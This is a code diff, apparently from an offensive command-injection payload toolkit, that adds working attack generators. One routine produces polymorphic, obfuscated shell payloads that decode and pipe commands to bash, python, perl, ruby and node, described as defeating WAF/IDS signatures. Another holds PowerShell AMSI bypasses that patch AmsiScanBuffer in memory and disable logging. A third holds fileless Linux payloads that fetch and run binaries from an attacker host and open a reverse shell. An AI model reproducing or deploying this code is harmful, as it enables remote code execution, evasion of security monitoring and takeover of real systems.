@@ -234,23 +234,36 @@ export function applyQuantumBypass(
       );
     }
 
-    case "quantum":
+    case "quantum": {
+      const jv  = () => `_v${rnd()}`;
+      const nop = (): string => {
+        const opts = [
+          `${jv()}=${rnd()}`,
+          `${jv()}=$((${rnd(1, 99)}*${rnd(1, 9)}))`,
+          `true`,
+          `:`,
+          `test ${rnd()} -ne ${rnd()}`,
+          `${jv()}=$(printf '%d' ${rnd()})`,
+        ];
+        return opts[Math.floor(Math.random() * opts.length)]!;
+      };
       return [
-        `{ {echo,${B64}}|{base64,-d}|bash; } 2>/dev/null`,
-        `|| { eval "$(printf '${HEX}')"; } 2>/dev/null`,
-        `|| { eval "$(printf '${OCT}')"; } 2>/dev/null`,
-        `|| { bash<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
-        `|| { $(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68') -c "$(printf '${HEX}')"; } 2>/dev/null`,
-        `|| { python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"; } 2>/dev/null`,
-        `|| { perl -e "system(pack('H*','${RHEX}'))"; } 2>/dev/null`,
-        `|| { ruby -e "require 'base64';system(Base64.decode64('${B64}'))"; } 2>/dev/null`,
-        `|| { node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"; } 2>/dev/null`,
-        `|| { bash<<<$(echo "${B64x2}"|base64 -d|base64 -d); } 2>/dev/null`,
-        `|| { bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
-        `|| { bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
-        `|| { echo ${RHEX}|xxd -r -p|bash; } 2>/dev/null`,
-        `|| { printf '${OCT}'|bash; } 2>/dev/null`,
+        `${jv()}=${rnd()};{ {echo,${B64}}|{base64,-d}|bash; } 2>/dev/null`,
+        `|| { ${nop()};eval "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| { ${nop()};eval "$(printf '${OCT}')"; } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};bash<<<$(echo${TAB}${B64}|base64${TAB}-d); } 2>/dev/null`,
+        `|| { ${nop()};$(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68') -c "$(printf '${HEX}')"; } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"; } 2>/dev/null`,
+        `|| { ${nop()};perl -e "system(pack('H*','${RHEX}'))"; } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};ruby -e "require 'base64';system(Base64.decode64('${B64}'))"; } 2>/dev/null`,
+        `|| { ${nop()};node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"; } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};bash<<<$(echo "${B64x2}"|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { ${nop()};bash<<<$(echo "${B64x3}"|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};bash<<<$(echo "${B64x4}"|base64 -d|base64 -d|base64 -d|base64 -d); } 2>/dev/null`,
+        `|| { ${nop()};echo ${RHEX}|xxd -r -p|bash; } 2>/dev/null`,
+        `|| { ${jv()}=${rnd()};printf '${OCT}'|bash; } 2>/dev/null`,
       ].join(" ");
+    }
 
     case "ifs": {
       const ifsRaw = raw.replace(/ /g, IFS);
@@ -1980,4 +1993,99 @@ export function buildContextPayloads(
 
     return [...new Set(set)].filter(Boolean);
   }
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   POLYMORPHIC PAYLOAD GENERATOR
+   Produces a different obfuscated variant on every call — no two requests
+   carry the same byte sequence, defeating static WAF/IDS signatures.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildPolymorphicPayload(cmd: string, bypassMode = "quantum"): string {
+  const raw = cmd.trim();
+  const B64 = b64(raw);
+  const HEX = hexEsc(raw);
+  const RHX = rawHex(raw);
+
+  // Random count of junk variable assignments (3–7)
+  const junkCount = 3 + Math.floor(Math.random() * 5);
+  const junkParts: string[] = [];
+  for (let j = 0; j < junkCount; j++) {
+    const vn = varName();
+    const pick = j % 4;
+    if (pick === 0)      junkParts.push(`${vn}=${rnd()}`);
+    else if (pick === 1) junkParts.push(`${vn}=$((${rnd(1,99)}*${rnd(1,99)}))`);
+    else if (pick === 2) junkParts.push(`${vn}=$(date +%s 2>/dev/null||echo ${rnd()})`);
+    else                 junkParts.push(`${vn}="${rnd()}${rnd()}"`);
+  }
+  const junk = junkParts.join(";");
+
+  // Pick a random encoding strategy for this call
+  const encoders: Array<() => string> = [
+    () => `{echo,${B64}}|{base64,-d}|bash`,
+    () => `eval "$(printf '${HEX}')"`,
+    () => `bash<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
+    () => `python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"`,
+    () => `perl -e "system(pack('H*','${RHX}'))"`,
+    () => `node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"`,
+    () => `ruby -e "require 'base64';system(Base64.decode64('${B64}'))"`,
+    () => `echo ${RHX}|xxd -r -p|bash`,
+  ];
+  const enc = encoders[Math.floor(Math.random() * encoders.length)]!();
+
+  // Splice the junk+encoding block into a random position of the base payload
+  const base  = applyQuantumBypass(cmd, bypassMode);
+  const parts = base.split("||");
+  const pos   = 1 + Math.floor(Math.random() * Math.max(1, parts.length - 1));
+  parts.splice(pos, 0, `{ ${junk};${enc}; } 2>/dev/null`);
+  return parts.join("||");
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   AMSI BYPASS PAYLOADS  (Windows / PowerShell)
+   Techniques that disable or patch AMSI before the real payload executes.
+   Use as a pre-stage before sending your PowerShell payload.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildAmsiBypassPayloads(): string[] {
+  return [
+    // Reflection — set amsiInitFailed = true (classic, still works on unpatched PS)
+    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
+    // String-split obfuscation to evade static analysis
+    `$a='Am'+'siU'+'tils';$b=[Ref].Assembly.GetType('System.Management.Automation.'+$a);$b.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true)`,
+    // Add-Type VirtualProtect patch (overwrites AmsiScanBuffer stub with ret 0)
+    `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxPatch{[DllImport("k"+"ernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("k"+"ernel32")]public static extern IntPtr LoadLibrary(string l);[DllImport("k"+"ernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Go(){uint o;IntPtr h=LoadLibrary("ams"+"i.dll");IntPtr f=GetProcAddress(h,"Amsi"+"ScanBuffer");VirtualProtect(f,(UIntPtr)5,0x40,out o);System.Runtime.InteropServices.Marshal.Copy(new byte[]{0x31,0xC0,0xC3,0x90,0x90},0,f,5);}}'; [NxPatch]::Go()`,
+    // PowerShell v2 downgrade (no AMSI in PS 2.0)
+    `powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command`,
+    // WMI execution bypass (spawns new process context without AMSI hooks)
+    `([wmiclass]'win32_process').Create("powershell -nop -ep bypass -e {B64CMD}")`,
+    // EnvVar-based bypass (breaks signature scanning context)
+    `$env:PSExecutionPolicyPreference='bypass';$e=[System.Text.Encoding]::Unicode;$d=[System.Convert]::FromBase64String`,
+    // Bypass via COM object (MshtmlHost)
+    `$c=New-Object -COM 'MsHtml.HtmlDocument';$c.GetType().InvokeMember('scripts','GetProperty',$null,$c,$null)`,
+    // ScriptBlock logging disable via reflection
+    `[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp');$t=[System.Management.Automation.PSParser].Assembly.GetType('System.Management.Automation.Security.SystemPolicy');$f=$t.GetField('cachedSystemLockdownPolicy','NonPublic,Static');if($f){$f.SetValue($null,-1)}`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FILELESS / IN-MEMORY EXECUTION PAYLOADS  (Linux)
+   Execute code entirely from RAM — no binary written to disk.
+   Useful for EDR evasion on hardened Linux targets.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildMemfdPayloads(ip: string, port: string | number): string[] {
+  return [
+    // Python3 memfd_create — load and exec ELF from memory
+    `python3 -c "import ctypes,os,socket;fd=ctypes.CDLL(None).memfd_create('',1);s=socket.socket();s.connect(('${ip}',${port}));d=b'';t=s.recv(65536);[d:=d+t for _ in iter(lambda:t,b'')];os.write(fd,d);os.execv('/proc/self/fd/'+str(fd),['x'])" 2>/dev/null`,
+    // Perl syscall 319 (memfd_create) wrapper
+    `perl -e 'use POSIX;$fd=syscall(319,"x",1);open my$f,">&=",$fd;print$f \`curl -sk http://${ip}:${port}/x\`;exec{"/proc/self/fd/$fd"}("x")' 2>/dev/null`,
+    // /dev/shm tmpfs — volatile memory filesystem (no disk flush under normal ops)
+    `T=$(mktemp -p /dev/shm 2>/dev/null||mktemp -p /run/shm 2>/dev/null||mktemp);curl -sk http://${ip}:${port}/x>$T;chmod +x $T;$T;rm -f $T 2>/dev/null`,
+    // Pure in-process Python reverse shell (no child process, no file)
+    `python3 -c "import socket,os;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),i) for i in range(3)];__import__('subprocess').call(['/bin/sh','-i'])" 2>/dev/null`,
+    // LD_PRELOAD shared library via /dev/shm (injected, not saved persistently)
+    `curl -sk http://${ip}:${port}/l.so -o /dev/shm/.l.so 2>/dev/null && LD_PRELOAD=/dev/shm/.l.so /bin/ls 2>/dev/null; rm -f /dev/shm/.l.so`,
+    // Bash + /proc/self/fd trick (open FD, write payload, exec via /proc)
+    `exec 9<>/dev/tcp/${ip}/${port} 2>/dev/null;cat <&9>/dev/shm/.x 2>/dev/null;chmod +x /dev/shm/.x;/dev/shm/.x;rm /dev/shm/.x 2>/dev/null`,
+    // Node.js Buffer-based in-memory eval (no fs.write)
+    `node -e "const c=require('child_process'),h=require('http');h.get('http://${ip}:${port}/p.js',r=>{let b='';r.on('data',d=>b+=d);r.on('end',()=>eval(b))})" 2>/dev/null`,
+  ];
+}
   
